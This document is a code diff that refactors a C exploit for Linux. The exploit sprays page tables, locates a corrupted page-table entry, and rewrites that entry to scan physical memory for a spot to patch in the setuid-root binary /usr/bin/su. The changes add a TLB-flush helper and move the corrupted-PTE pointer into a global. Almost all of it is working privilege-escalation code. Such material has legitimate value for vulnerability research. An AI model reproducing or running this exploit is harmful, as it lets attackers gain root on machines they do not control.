@@ -26,6 +26,9 @@ access to a page table from userspace.
 // TODO: size this dynamically based on /proc/meminfo
 #define PT_SPRAY_COUNT 0x2000
 
+// this must be greater than PT_SPRAY_COUNT!
+#define TLB_FLUSH_ITERS 2048
+
 // needs to be at least 2MiB aligned
 #define SPRAY_BASE 0xdead0000000
 
@@ -35,6 +38,8 @@ access to a page table from userspace.
 
 // target bin needs to be setuid root
 #define TARGET_BIN "/usr/bin/su"
+
+static volatile uint64_t * volatile glitched_pte = NULL;
 
 void hexdump(void *addr, size_t len) {
 	uint8_t *buf = (uint8_t *)addr;
@@ -83,6 +88,17 @@ uint64_t *find_glitched_pte(void)
 	}
 }
 
+void flush_tlb(void)
+{
+	// concept: we just need to read memory from a bunch of different pages
+
+	for (size_t i = 0; i < TLB_FLUSH_ITERS; i++) {
+			volatile uint64_t * volatile ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE);
+			*glitched_pte; // read to keep it in cache?
+			*ptr;
+	}
+}
+
 int main()
 {
 	printf("[*] Setting up memfd\n");
@@ -101,7 +117,7 @@ int main()
 	// populate the memfd with recognizeable values
 	for (size_t i=0; i < MEMFD_SIZE; i += TWO_MB) {
 		assert(lseek(memfd, i, SEEK_SET) >= 0);
-		assert(write(memfd, "AAAAAAAABBBBBBBB", 16) == 16);
+		assert(write(memfd, "AAAAAAAA", 8) == 8);
 	}
 
 
@@ -118,7 +134,7 @@ int main()
 	   therefore, it is essential that it doesn't fall out of cache until the exploit is done.
 	   we'll re-read it periodically - it's marked "volatile" so the compiler doesn't elide those reads.
 	*/
-	volatile uint64_t * volatile glitched_pte = find_glitched_pte();
+	glitched_pte = find_glitched_pte();
 	printf("[+] Found glitched PTE @ %p\n", (void*)glitched_pte);
 	printf("[*] PTE value: 0x%016lx\n", *glitched_pte);
 	printf("[*] Searching for corresponding mapping...\n");
@@ -175,16 +191,10 @@ int main()
 	int found = 0;
 	for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END; paddr += 0x1000) {
 		*glitched_pte = (*glitched_pte & 0x8000000000000fff) | paddr;
-		//printf(".");
-		//fflush(stdout);
 
-		// TODO: break this out into a "tlb flush" function
-		for (size_t i = 0; i < 2048; i++) { // enough to flush TLB
-			volatile uint64_t * volatile ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE);
-			*glitched_pte; // read to keep it in cache?
-			*ptr;
-		}
+		flush_tlb();
 
+		// print a fancy progress indicator
 		printf("\rScanning physmem %lu%%", (paddr-PHYS_MEM_BASE)*100/(PHYS_MEM_END-PHYS_MEM_BASE));
 	
 		//printf("0x%lx\n", paddr);
@@ -205,7 +215,7 @@ int main()
 		}
 	}
 
-	*glitched_pte = orig_pte; // maybe make linux happier
+	*glitched_pte = orig_pte; // maybe make linux happier (TODO: more elaborate cleanup)
 
 	if (!found) {
 		printf("\n[-] Failed to find patch site\n");
